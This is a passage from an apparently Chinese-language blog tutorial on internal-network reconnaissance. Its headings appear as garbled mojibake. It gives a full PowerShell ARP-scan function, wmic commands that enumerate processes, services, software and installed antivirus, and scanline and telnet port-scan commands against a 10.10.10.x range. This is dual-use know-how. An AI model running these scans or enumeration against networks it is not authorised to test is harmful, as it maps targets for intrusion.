C:\Users\Administrator\Desktop\Result.txt</span><br></pre></td></tr></table></figure><p><code>Invoke-ARPScan.ps1å¦‚ä¸‹</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ARPScan</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment">   Part of Posh-SecMod (https://github.com/darkoperator/Posh-SecMod/)</span></span><br><span class="line"><span class="comment">   Author: darkoperator</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">   Performs an ARP scan against a given range of IPv4 IP Addresses.</span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">   Invoke an ARP Scan against a range of IPs specified in CIDR Format</span></span><br><span class="line"><span class="comment">    PS C:\&gt; Invoke-ARPScan -CIDR 172.20.10.1/24</span></span><br><span class="line"><span class="comment">    MAC                                                       Address                                                  </span></span><br><span class="line"><span class="comment">    ---                                                       -------                                                  </span></span><br><span class="line"><span class="comment">    14:10:9F:D5:1A:BF                                         172.20.10.2                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.3                                              </span></span><br><span class="line"><span class="comment">    00:0C:29:93:10:B5                                         172.20.10.15  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    <span class="keyword">param</span> (</span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;Range&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$Range</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">ParameterSetName</span> = <span class="string">&quot;CIDR&quot;</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$CIDR</span>,</span><br><span class="line"></span><br><span class="line">        [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$false</span>,</span><br><span class="line">                   <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                   <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">        [<span class="built_in">string</span>]<span class="variable">$MaxThreads</span>=<span class="number">50</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Begin</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4Range</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a Start and End IP.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$StartIP</span>,</span><br><span class="line">                           </span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">                           <span class="variable">$EndIP</span>          </span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># created by Dr. Tobias Weltner, MVP PowerShell</span></span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip1</span>)</span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip1</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip2</span>)</span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip2</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="variable">$ip1</span>; <span class="variable">$x</span> <span class="operator">-le</span> <span class="variable">$ip2</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$x</span>).GetAddressBytes()</span><br><span class="line">                [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip</span>)</span><br><span class="line">                <span class="variable">$ip</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4RangeFromCIDR</span> </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$Network</span></span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># Extract the portions of the CIDR that will be needed</span></span><br><span class="line">            <span class="variable">$StrNetworkAddress</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$NetworkLength</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">1</span>]</span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StrNetworkAddress</span>).GetAddressBytes()</span><br><span class="line">            <span class="variable">$IPLength</span> = <span class="number">32</span>-<span class="variable">$NetworkLength</span></span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$NetworkIP</span>)</span><br><span class="line">            <span class="variable">$NumberOfIPs</span> = ([<span class="type">System.Math</span>]::Pow(<span class="number">2</span>, <span class="variable">$IPLength</span>)) <span class="literal">-1</span></span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$NetworkIP</span> <span class="operator">-join</span> <span class="string">&quot;.&quot;</span>)).Address</span><br><span class="line">            <span class="variable">$StartIP</span> = <span class="variable">$NetworkIP</span> +<span class="number">1</span></span><br><span class="line">            <span class="variable">$EndIP</span> = <span class="variable">$NetworkIP</span> + <span class="variable">$NumberOfIPs</span></span><br><span class="line">            <span class="comment"># We make sure they are of type Double before conversion</span></span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$EndIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$EndIP</span> = <span class="variable">$EndIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$StartIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$StartIP</span> = <span class="variable">$StartIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># We turn the start IP and end IP in to strings so they can be used.</span></span><br><span class="line">            <span class="variable">$StartIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).IPAddressToString</span><br><span class="line">            <span class="variable">$EndIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).IPAddressToString</span><br><span class="line">            <span class="built_in">New-IPv4Range</span> <span class="variable">$StartIP</span> <span class="variable">$EndIP</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sign</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Net;</span></span><br><span class="line"><span class="string">using System.Net.NetworkInformation;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public static class NetUtils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [System.Runtime.InteropServices.DllImport(&quot;iphlpapi.dll&quot;, ExactSpelling = true)]</span></span><br><span class="line"><span class="string">    static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);</span></span><br><span class="line"><span class="string">    public static string GetMacAddress(String addr)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        try</span></span><br><span class="line"><span class="string">                &#123;                   </span></span><br><span class="line"><span class="string">                    IPAddress IPaddr = IPAddress.Parse(addr);</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">                    byte[] mac = new byte[6];</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    int L = 6;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    SendARP(BitConverter.ToInt32(IPaddr.GetAddressBytes(), 0), 0, mac, ref L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    String macAddr = BitConverter.ToString(mac, 0, L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    return (macAddr.Replace(&#x27;-&#x27;,&#x27;:&#x27;));</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                catch (Exception ex)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    return (ex.Message);              </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Instanciating NetUtils&quot;</span></span><br><span class="line">            <span class="variable">$IPHlp</span> = <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$sign</span> <span class="literal">-Language</span> CSharp <span class="literal">-PassThru</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;NetUtils already instanciated&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if range is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Range</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$rangeips</span> = <span class="variable">$Range</span>.Split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4Range</span> <span class="literal">-StartIP</span> <span class="variable">$rangeips</span>[<span class="number">0</span>] <span class="literal">-EndIP</span> <span class="variable">$rangeips</span>[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if CIDR is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CIDR</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4RangeFromCIDR</span> <span class="literal">-Network</span> <span class="variable">$CIDR</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Process</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$scancode</span> = &#123;</span><br><span class="line">            <span class="keyword">param</span>(<span class="variable">$IPAddress</span>,<span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$IPHlp::GetMacAddress</span>(<span class="variable">$IPAddress</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="built_in">New-Object</span> psobject <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Address = <span class="variable">$IPAddress</span>; MAC = <span class="variable">$result</span>&#125;&#125;</span><br><span class="line">        &#125; <span class="comment"># end ScanCode var</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$start</span> = <span class="built_in">get-date</span></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Begin Scanning at <span class="variable">$start</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Multithreading setup</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a pool of maxThread runspaces   </span></span><br><span class="line">        <span class="variable">$pool</span> = [<span class="type">runspacefactory</span>]::CreateRunspacePool(<span class="number">1</span>, <span class="variable">$MaxThreads</span>)   </span><br><span class="line">        <span class="variable">$pool</span>.Open()</span><br><span class="line">  </span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$ps</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$wait</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># How many servers</span></span><br><span class="line">        <span class="variable">$record_count</span> = <span class="variable">$targets</span>.Length</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Loop through the endpoints starting a background job for each endpoint</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$IPAddress</span> <span class="keyword">in</span> <span class="variable">$targets</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># Show Progress</span></span><br><span class="line">            <span class="variable">$record_progress</span> = [<span class="built_in">int</span>][<span class="type">Math</span>]::Ceiling(((<span class="variable">$i</span> / <span class="variable">$record_count</span>) * <span class="number">100</span>))</span><br><span class="line">            <span class="comment"># Write-Progress -Activity &quot;Performing ARP Scan&quot; -PercentComplete $record_progress -Status &quot;Addresses Queried - $record_progress%&quot; -Id 1;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$pool</span>.GetAvailableRunspaces()) <span class="operator">-le</span> <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># create a &quot;powershell pipeline runner&quot;</span></span><br><span class="line">            <span class="variable">$ps</span> += [<span class="type">powershell</span>]::create()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># assign our pool of 3 runspaces to use   </span></span><br><span class="line">            <span class="variable">$ps</span>[<span class="variable">$i</span>].runspacepool = <span class="variable">$pool</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># command to run</span></span><br><span class="line">            [<span class="built_in">void</span>]<span class="variable">$ps</span>[<span class="variable">$i</span>].AddScript(<span class="variable">$scancode</span>).AddParameter(<span class="string">&#x27;IPaddress&#x27;</span>, <span class="variable">$IPAddress</span>).AddParameter(<span class="string">&#x27;IPHlp&#x27;</span>, <span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="comment">#[void]$ps[$i].AddParameter()</span></span><br><span class="line">    </span><br><span class="line">            <span class="comment"># start job</span></span><br><span class="line">            <span class="variable">$jobs</span> += <span class="variable">$ps</span>[<span class="variable">$i</span>].BeginInvoke();</span><br><span class="line">     </span><br><span class="line">            <span class="comment"># store wait handles for WaitForAll call   </span></span><br><span class="line">            <span class="variable">$wait</span> += <span class="variable">$jobs</span>[<span class="variable">$i</span>].AsyncWaitHandle</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Waiting for scanning threads to finish...&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$waitTimeout</span> = <span class="built_in">get-date</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$jobs</span> | ? &#123;<span class="variable">$_</span>.IsCompleted <span class="operator">-eq</span> <span class="variable">$false</span>&#125;).count <span class="operator">-gt</span> <span class="number">0</span> <span class="operator">-or</span> <span class="variable">$</span>(<span class="variable">$</span>(<span class="variable">$</span>(<span class="built_in">get-date</span>) - <span class="variable">$waitTimeout</span>).totalSeconds) <span class="operator">-gt</span> <span class="number">60</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">        &#125; </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># end async call   </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> <span class="operator">-lt</span> <span class="variable">$i</span>; <span class="variable">$y</span>++) &#123;     </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment"># complete async job   </span></span><br><span class="line">                <span class="variable">$ScanResults</span> += <span class="variable">$ps</span>[<span class="variable">$y</span>].EndInvoke(<span class="variable">$jobs</span>[<span class="variable">$y</span>])   </span><br><span class="line">  </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span> </span><br><span class="line">            &#123;   </span><br><span class="line">       </span><br><span class="line">                <span class="built_in">write-warning</span> <span class="string">&quot;error: <span class="variable">$_</span>&quot;</span>  </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">finally</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ps</span>[<span class="variable">$y</span>].Dispose()</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pool</span>.Dispose()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ScanResults</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-wmicçš„ç®€å•ä½¿ç”¨"><a href="#0x03-wmicçš„ç®€å•ä½¿ç”¨" class="headerlink" title="0x03.wmicçš„ç®€å•ä½¿ç”¨"></a>0x03.wmicçš„ç®€å•ä½¿ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wmic /?        #å…¨å±€å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process /?        #è¿›ç¨‹å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process get /?        #å±æ€§è·å–æ“ä½œå¸®åŠ©</span><br><span class="line">wmic process get caption,executablepath,processid    #è·å–å½“å‰è¿è¡Œè¿›ç¨‹ã€è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹id</span><br><span class="line">wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productstate,pathtosignedproductexe</span><br><span class="line">wmic onboarddevice get description,devicetype,enable,status /format:list</span><br><span class="line">wmic product get name    #ç³»ç»Ÿè½¯ä»¶å®‰è£…æƒ…å†µ</span><br><span class="line">wmic environment get description,variablevalue    #æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</span><br><span class="line">wmic computersystem get name,domain,manufacturer,model,username,roles/format:list</span><br><span class="line">wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list</span><br></pre></td></tr></table></figure><h2 id="0x04-åŸŸå†…ç«¯å£æ¢æµ‹"><a href="#0x04-åŸŸå†…ç«¯å£æ¢æµ‹" class="headerlink" title="0x04.åŸŸå†…ç«¯å£æ¢æµ‹"></a>0x04.åŸŸå†…ç«¯å£æ¢æµ‹</h2><h3 id="01-scanlineTCP-UDPç«¯å£æ¢æµ‹"><a href="#01-scanlineTCP-UDPç«¯å£æ¢æµ‹" class="headerlink" title="01.scanlineTCP/UDPç«¯å£æ¢æµ‹"></a>01.scanlineTCP/UDPç«¯å£æ¢æµ‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\Administrator\Desktop\log.txt -p 10.10.10.1-254</span><br></pre></td></tr></table></figure><h3 id="02-telnetæ‰«æ"><a href="#02-telnetæ‰«æ" class="headerlink" title="02.telnetæ‰«æ"></a>02.telnetæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.10 22</span><br></pre></td></tr></table></figure><h3 id="03-metasploitç«¯å£æ‰«æ"><a href="#03-metasploitç«¯å£æ‰«æ" class="headerlink" 